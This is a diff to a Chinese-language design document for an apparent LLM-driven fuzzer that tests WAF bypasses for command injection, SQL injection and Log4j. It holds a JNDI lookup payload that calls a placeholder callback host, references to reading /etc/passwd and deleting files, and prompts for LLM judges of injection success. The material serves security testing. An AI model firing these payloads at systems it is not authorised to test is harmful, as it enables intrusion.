@@ -117,6 +117,9 @@ class ObserverRequest:
     responses: list[RawResponse]
     baseline_html: str
     vuln_type: str
+    oob_server: str | None = None       # 回调服务器地址（仅 log4j/deserialization）
+    oob_poll_api: str | None = None     # 轮询 API 端点
+    oob_tokens: dict[str, str] | None = None  # payload_index → unique_token 映射
 
 @dataclass
 class Verdict:
@@ -251,20 +254,25 @@ class Solver:
 for each RawResponse:
   1. 状态码短路：403/406/501/429 → blocked
   2. 文本提取（三级回退）：<pre> → <code>/<samp> → <body>
-  3. Baseline diff：行级差集，无增量 → blocked
+  3. Baseline diff：行级差集，无增量 → blocked（OOB 类型除外）
   4. 假阳性过滤：WAF 拦截页 / Shell 报错 / 空行
-  5. 按 vuln_type 分流：
-     CMDI：硬编码正则（零 Token）
-       - 读取类：系统账户名 / base64 串
-       - 创建类：fzcr_ marker
-       - 删除类：ls 输出验证
-     SQLi：LLM 判定（独立 Prompt）
-       - Observer 自行从响应推断注入类型
-       - 回显是否含数据库结构/数据
-       - 响应延时是否异常
+  5. 按 vuln_type 分流判定（见下文各类型详解）
 ```
 
-### SQLi Observer Prompt 设计
+### CMDI 判定（硬编码正则，零 Token）
+
+继承现有 `inline_parser.py` 的 `_has_cmdi_evidence()` 逻辑：
+
+| 命令类型 | 检测模式 | 说明 |
+|---------|---------|------|
+| 读取类 | `_CMDI_PASSWD_LINE`：`root:`/`daemon:` 等系统账户名+冒号 | 检测 /etc/passwd 回显 |
+| 读取类 | `_CMDI_BASE64`：≥60 字符的连续 base64 串 | 检测 base64 编码回显 |
+| 创建类 | `_CMDI_CREATE_MARKER`：回显含 `fzcr_` + 4 位随机字符 | 自包含验证：echo marker → cat 验证 |
+| 删除类 | `_CMDI_LS_BLINDSIGHT`：ls 输出中目标文件消失 | 三步验证：rm → ls 确认消失 |
+
+### SQLi 判定（LLM 独立判定）
+
+Observer 不接收 payload 语义，完全从响应内容推断：
 
 ```
 你是一个独立的 HTTP 响应分析器。判断以下响应是否表明存在 SQL 注入成功的迹象。
@@ -278,10 +286,111 @@ for each RawResponse:
 1. 响应是否包含数据库结构信息（表名、列名、数据库版本）？
 2. 响应是否包含非页面框架的用户数据？
 3. 响应耗时是否显著异常（>3x 基线）？
-4. 响应是否包含数据库错误信息中嵌套的数据？
+4. 响应是否包含 MySQL/PostgreSQL/Oracle 错误信息中嵌套的数据？
 
 返回 JSON：{"bypass": true/false, "confidence": 0-1, "reason": "..."}
 ```
+
+### Log4j / 反序列化判定（OOB + 错误型 + 时序型）
+
+Log4j (CVE-2021-44228) 及 Java 反序列化漏洞的检测与 CMDI/SQLi 本质不同：
+成功标志不是响应体中的内容变化，而是**目标服务器发起了出站连接**（JNDI/LDAP/RMI/DNS lookup）。
+
+**三重判定策略**：
+
+#### 策略 1：OOB 回调检测（主要手段，零误报）
+
+Solver 在 payload 中嵌入可控回调地址（如 `${jndi:ldap://oob.example.com/xxx}`），
+Observer 轮询回调服务器的接收日志，确认目标是否发起了出站连接。
+
+```
+Observer OOB 检测流程：
+  1. 从 ObserverRequest.callback_server 获取回调服务器配置
+  2. 为每个 payload 生成唯一 subdomain/token（如 round3-p7.oob.example.com）
+  3. 发包后轮询回调服务器 API：
+     GET https://oob.example.com/api/poll?token={token}
+  4. 收到回调 → bypass=True，附带回调类型（DNS/HTTP/LDAP/RMI）和时间戳
+  5. 超时未收到 → blocked
+```
+
+回调服务器支持：
+- **自建**：`interactsh` / `dnslog.cn` / 自建 DNS 服务器
+- **配置方式**：`config/target.yaml` 中 `oob_server` 字段
+
+#### 策略 2：错误型检测（辅助手段）
+
+JNDI lookup 失败时（如目标无法出网），响应可能包含错误信息：
+
+```
+检测模式（硬编码正则，零 Token）：
+  - javax.naming.CommunicationException
+  - javax.naming.NameNotFoundException
+  - java.lang.ClassNotFoundException
+  - JNDI lookup failed
+  - Error looking up JNDI resource
+  - com.sun.jndi.ldap.LdapCtx
+  - java.rmi.RemoteException
+  - 特定厂商错误：Weblogic T3/IIOP 错误特征
+```
+
+这些错误说明 JNDI lookup **确实被执行了**（只是连接目标不通），属于高置信度 bypass。
+
+#### 策略 3：时序型检测（辅助手段）
+
+JNDI lookup 如果连接超时，会引入可测量的响应延迟：
+
+```
+时序判定逻辑：
+  - baseline 响应时间 < 500ms
+  - payload 响应时间 > 3000ms
+  - 且响应体无 WAF 拦截页特征
+  → 判定为可能的 JNDI 超时，confidence=0.5（需 OOB 二次确认）
+```
+
+#### Log4j Observer Prompt 设计
+
+```
+你是一个独立的 HTTP 响应分析器。判断以下响应是否表明存在 Log4j / JNDI 注入成功的迹象。
+你不知道发送了什么 payload，只能从响应本身判断。
+
+响应文本：{diff 后的文本}
+响应耗时：{elapsed_ms}ms
+基线耗时：{baseline_ms}ms
+OOB 回调状态：{oob_status}  （"none" / "dns_received" / "http_received" / "ldap_received"）
+
+判断标准：
+1. OOB 回调已收到 → bypass=True，confidence=1.0
+2. 响应包含 JNDI/LDAP/RMI 异常堆栈 → bypass=True，confidence=0.9
+3. 响应耗时显著异常且无 WAF 拦截特征 → bypass=True，confidence=0.5
+4. 响应包含 WAF 拦截页特征 → blocked
+5. 其他 → blocked
+
+返回 JSON：{"bypass": true/false, "confidence": 0-1, "reason": "..."}
+```
+
+#### ObserverRequest 扩展
+
+为支持 OOB 检测，`ObserverRequest` 已在第 4 节数据结构中包含 `oob_server`、`oob_poll_api`、`oob_tokens` 三个可选字段。Manager 在构造 Log4j 类型请求时填充这些字段，CMDI/SQLi 类型不填充（保持 `None`）。
+
+### 通用漏洞类型扩展框架
+
+Observer 的判定路由设计为可扩展：
+
+```python
+class Observer:
+    JUDGES = {
+        "cmdi": CMDIJudge(),           # 硬编码正则
+        "sqli": SQLiJudge(),           # LLM 判定
+        "log4j": Log4jJudge(),         # OOB + 错误型 + 时序型
+        "deserialization": Log4jJudge(),  # 复用 Log4j 的 OOB 检测逻辑
+    }
+
+    def evaluate(self, request: ObserverRequest) -> ObserverResult:
+        judge = self.JUDGES.get(request.vuln_type, GenericJudge())
+        # ...
+```
+
+新增漏洞类型只需实现 `Judge` 接口并注册即可，无需修改 Observer 核心逻辑。
 
 ---
 
@@ -341,6 +450,14 @@ fuzzing:
   dimension_switch_threshold: 3
   perf_padding_size: 102400
   perf_concurrency: 50
+
+# 新增：OOB 回调服务器配置（Log4j / 反序列化检测用）
+oob:
+  server: "oob.example.com"           # 回调服务器域名
+  poll_api: "https://oob.example.com/api/poll"  # 轮询 API
+  api_key: ""                         # 认证密钥（可选）
+  poll_interval_ms: 2000              # 轮询间隔（毫秒）
+  poll_timeout_ms: 30000              # 最大等待时间（毫秒）
 ```
 
 ---
@@ -351,7 +468,8 @@ fuzzing:
 |---------|------|------|
 | `workflow.py` | → `manager.py` + `main.py` | 循环控制归 Manager，入口归 main.py |
 | `llm_engine.py` generate/mutate | → `solver.py` + `semantic.py` | Payload 生成归 Solver |
-| `llm_engine.py` judge_sqli | → `observer.py` | 判定逻辑归 Observer |
+| `llm_engine.py` judge_sqli | → `observer.py` | SQLi 判定逻辑归 Observer |
+| （新增）Log4j OOB 检测 | → `observer.py` | Log4j 判定：OOB + 错误型 + 时序型 |
 | `llm_engine.py` login/KB | → `manager.py` | 管理逻辑归 Manager |
 | `inline_parser.py` | → `observer.py` | 证据提取归 Observer |
 | `requester.py` | → `core/requester.py` | 共享工具，被 Solver 调用 |
@@ -369,6 +487,9 @@ fuzzing:
 - 基线 diff 优先 → Observer
 - CMDI 硬编码证据正则 → Observer（零 Token）
 - SQLi LLM 判定 → Observer（仅 SQLi 消耗 Token）
+- Log4j OOB 回调检测 → Observer（零 Token，轮询回调服务器）
+- Log4j 错误型检测 → Observer（硬编码正则，零 Token）
+- Log4j 时序型检测 → Observer（仅高置信度疑似时调 LLM 二次确认）
 - Parser 内联管道 → Observer
 - 极简拦截列表 → Manager 传递给 Solver
 - 逐轮压缩整合 → Manager + `core/memory_compressor.py`
